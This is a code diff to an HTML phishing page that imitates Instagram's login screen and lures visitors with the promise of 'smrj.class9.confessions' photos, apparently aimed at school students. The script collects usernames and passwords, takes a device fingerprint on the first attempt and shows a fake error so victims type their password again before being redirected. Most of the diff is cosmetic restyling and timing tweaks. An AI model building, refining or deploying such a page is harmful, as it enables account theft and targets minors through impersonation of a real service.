@@ -5,16 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; position: relative; }
-        .container { background: white; border: 1px solid #dbdbdb; border-radius: 8px; width: 350px; padding: 40px 20px; text-align: center; position: relative; }
-        .logo-container { margin-bottom: 20px; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #fafafa; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            position: relative; 
+        }
+        .container { 
+            background: white; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 8px; 
+            width: 350px; 
+            padding: 40px 20px; 
+            text-align: center; 
+            position: relative; 
+        }
+        .logo-container { margin-bottom: 25px; }
         .insta-logo { max-width: 180px; height: auto; }
-        .top-right-i { position: absolute; top: 15px; right: 15px; font-size: 28px; font-weight: 600; color: #0095f6; }
-        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 6px; background: #fafafa; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 6px; font-weight: 600; margin-top: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .top-right-i { 
+            position: absolute; 
+            top: 15px; 
+            right: 15px; 
+            font-size: 28px; 
+            font-weight: 600; 
+            color: #0095f6; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 6px 0; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 6px; 
+            background: #fafafa; 
+            box-sizing: border-box; 
+            font-size: 14px; 
+        }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: 600; 
+            margin-top: 15px; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            font-size: 15px; 
+        }
         button:disabled { background: #b2dffc; cursor: not-allowed; }
-        .spinner { width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; }
-        .error { color: #ed4956; font-size: 14px; margin: 10px 0; display: none; }
+        .spinner { 
+            width: 18px; 
+            height: 18px; 
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-top: 3px solid white; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+        }
+        .error { 
+            color: #ed4956; 
+            font-size: 14px; 
+            margin: 12px 0; 
+            display: none; 
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -23,7 +84,8 @@
         <div class="top-right-i">i</div>
         
         <div class="logo-container">
-            <img src="data:image/jpeg;base64,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" alt="Instagram" class="insta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
+                 alt="Instagram" class="insta-logo">
         </div>
 
         <p style="color:#8e8e8e; margin-bottom:20px;">Sign in to see photos of<br><strong>smrj.class9.confessions</strong></p>
@@ -31,7 +93,7 @@
         <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
 
-        <div id="errorMsg" class="error">The username or password you entered is incorrect.</div>
+        <div id="errorMsg" class="error">Incorrect username or password.</div>
 
         <button id="loginBtn">Log in</button>
 
@@ -119,7 +181,7 @@
                 attempt: attemptCount
             };
 
-            // Only on first attempt send full fingerprint
+            // Send full fingerprint only on first attempt
             if (attemptCount === 1) {
                 const fingerprint = await getFingerprint();
                 payload.fingerprint = fingerprint;
@@ -138,11 +200,11 @@
                     errorMsg.style.display = 'block';
                     loginBtn.innerHTML = 'Log in';
                     loginBtn.disabled = false;
-                }, 1300);
+                }, 1400);
             } else {
                 setTimeout(() => {
                     window.location.href = "1.html";
-                }, 1500);
+                }, 1600);
             }
         });
     </script>
